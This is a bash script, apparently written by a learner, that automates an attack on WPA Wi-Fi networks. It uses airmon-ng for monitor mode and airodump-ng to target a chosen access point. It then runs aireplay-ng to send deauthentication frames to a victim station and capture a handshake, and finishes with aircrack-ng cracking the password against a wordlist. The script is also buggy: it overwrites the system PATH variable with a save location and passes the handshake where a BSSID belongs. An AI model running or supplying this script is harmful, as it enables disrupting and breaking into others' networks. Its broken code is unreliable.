#! /bin/bash

# shellOutput=$(echo $SHELL) # ///// This is not needed if I'm simplifying the script to just use xterm, I will need it if I want the script to choose which command to run based on the shell type

# interface=$(echo $netstat -i) # ///// How do I parse through the netstat and pull the wlan? AGAIN not needed if I just assign the user input to the interface variable.

airmon-ng check kill

sleep 5

# This is going to open a new terminal so that it is EASY for the user to know what to look for
gnome-terminal -e airmon-ng && sleep 5 &   #& exit

# This will just have the user input the interface (wifi card) to be used for this attack
echo -n ""$USER", enter which Interface to use: "
read interface

# I don't know what this is or where is came from! JK, I saw it in another script and I was not sure if I needed it or not?
#grep -i "$interface"

# What I was attempting was to ensure that they entered an interface and if not ask them again. Also it would set the user input to the variable interface
# I could duplicate this several times throughout and add error checking, but for simplicity and because I'm lazy and I dont know if it works, I only did this one.
#if [ "$interface" == 0 or "$interface" == " " ]; then
#        echo "You need to enter which interface you want to use: (wlan0 or ?) "
#else [ "$interface" == wlan0 or wlan0mon or wlan1 or wlan1mon ]; then
#        read interface
#fi

# I need this part to itterate through the var interface and look for matches to the user input
# Or I can use the user input to directly inject into script /// PREFERED METHOD

# This is what puts the wifi card in Monitor mode
airmon-ng start "$interface"

# This opens a seperate terminal for the actual active network monitoring and should close after 60 seconds, giving the user just enough time to pick a target
xterm -hold -e airodump-ng $interface && sleep 5 & #& exit
 

# This should take the user input and save it to the variable bssid
echo -n ""$USER", enter the BSSID of the TARGET: " &
read bssid

# This should take the user input and save it to the variable channel
echo -n ""$USER", which CHANNEL is the TARGET broadcasting?: " &
read channel

# This should take the user input and save it to the variable PATH
echo -n ""$USER", where would you like to save your work? (The full PATH is needed here): " &
read PATH

# This opens a new terminal to run the actual command that issolates the specific target network and sets up for aireplay and the deauth
xterm -hold -e sudo airodump-ng -c $channel --bssid $bssid -w $PATH $interface

# This should take the user input and save it to the variable station
echo -n "lastly "$USER", what is the STATION id of your target? " &
read station

# This command sends the deauth to the target network in hopes that the handshake will be acquired
xterm -hold -e sudo aireplay-ng -0 4 -a $bssid -c $station $interface

# Just giving the deauth time to work
sleep 10

# This should take the user input and save it to the variable handshake
echo -n ""$USER", enter WPA handshake: " &
read handshake

# This should take the user input and save it to the variable wPath
echo -n "Last question I have for you "$USER", where is your wordlist to be used located? " &
read wPath

# This open the final terminal just so the user can see everything working. But this is where all the variables are collected and used
# Im not sure if the +*.cap works as an concatenation or not but the idea was to add the file extension to the final file name
xterm -hold -e sudo aircrack-ng -a2 -b $handshake -w $wPath $PATH+*.cap

